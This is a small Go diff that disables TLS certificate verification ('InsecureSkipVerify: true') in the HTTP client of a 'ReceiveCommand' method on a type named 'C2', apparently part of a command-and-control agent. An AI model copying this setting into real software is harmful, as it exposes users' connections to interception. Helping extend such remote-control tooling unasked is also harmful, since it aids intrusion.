@@ -2,6 +2,7 @@ package utils
 
 import (
 	"bytes"
+	"crypto/tls"
 	"fmt"
 	"io"
 	"log"
@@ -15,6 +16,9 @@ func (server *C2) ReceiveCommand() (command string) {
 		MaxIdleConns:       10,
 		IdleConnTimeout:    30 * time.Second,
 		DisableCompression: true,
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
 	}
 	client := &http.Client{
 		Transport: tr,
